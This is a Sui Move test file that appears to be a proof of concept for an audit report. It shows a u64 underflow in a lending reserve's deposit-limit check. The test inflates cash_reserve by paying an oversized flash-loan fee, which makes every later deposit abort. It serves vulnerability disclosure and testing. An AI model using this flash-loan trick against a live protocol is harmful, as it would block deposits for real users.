// PoC for Report #041: deposit_limit_breached u64 Underflow Blocks All Deposits
//
// Target: contracts/protocol/sources/internal/market/reserve.move:87-89
// Place in: contracts/protocol/sources/internal/market/ (or tests/ directory)
// Run:   sui move test --filter poc_041

#[test_only]
module protocol::poc_041_deposit_limit_underflow {
    use protocol::reserve;

    public struct PoCMarket {}
    public struct PoCCoin {}

    /// Proves that deposit_limit_breached aborts with u64 underflow when
    /// cash_reserve exceeds total_deposit_plus_interest + increment.
    ///
    /// The buggy formula:
    ///   total_deposit_plus_interest.ceil() + increment - cash_reserve.ceil() > limit
    ///
    /// When cash_reserve > total_deposit_plus_interest + increment, the subtraction
    /// underflows u64, causing an unconditional abort that blocks ALL deposits
    /// regardless of the configured limit.
    ///
    /// Setup:
    ///   deposit 1000, then flash loan with 2000 fee → cash_reserve = 2000
    ///   total_deposit_plus_interest = (3000+0-2000)/1000 * 1000 = 1000
    ///   Check: 1000 + 10 - 2000 → u64 UNDERFLOW → ABORT
    ///
    /// The test PASSES (via #[expected_failure]) because the abort IS the bug —
    /// a legitimate 10-token deposit is blocked even though the limit is 999M.
    #[test]
    #[expected_failure]
    fun test_deposit_blocked_by_underflow() {
        let admin = @0xAD;
        let mut scenario_value = sui::test_scenario::begin(admin);
        let ctx = scenario_value.ctx();
        let mut reserve = reserve::new<PoCMarket, PoCCoin>(ctx, 0);

        // Step 1: Deposit 1000 tokens
        let coin = sui::balance::create_for_testing<PoCCoin>(1000).into_coin(ctx);
        let _ctokens = reserve.mint_ctokens<PoCMarket, PoCCoin>(coin);
        // State: cash=1000, supply=1000, cash_reserve=0

        // Step 2: Flash loan with large fee to inflate cash_reserve
        //   borrow 1 token, repay with 2000 fee → cash_reserve += 2000
        let (flash_balance, loan) = reserve.borrow_flash_loan<PoCMarket, PoCCoin>(1);
        let repay_coin = sui::balance::create_for_testing<PoCCoin>(1).into_coin(ctx);
        let fee_coin = sui::balance::create_for_testing<PoCCoin>(2000).into_coin(ctx);
        reserve.repay_flash_loan(loan, repay_coin, fee_coin);
        sui::balance::destroy_for_testing(flash_balance);
        // State: cash=3000, supply=1000, cash_reserve=2000
        // exchange_rate = (3000+0-2000)/1000 = 1.0
        // total_deposit_plus_interest = 1000

        // Step 3: deposit_limit_breached → u64 UNDERFLOW
        //   1000 + 10 - 2000 = -990 → ABORT
        //   A tiny 10-token deposit is blocked despite limit being 999M
        let _ = reserve.deposit_limit_breached(10, 999_999_999);

        // Never reached — cleanup for compiler
        std::unit_test::destroy(_ctokens);
        std::unit_test::destroy(reserve);
        scenario_value.end();
    }
}
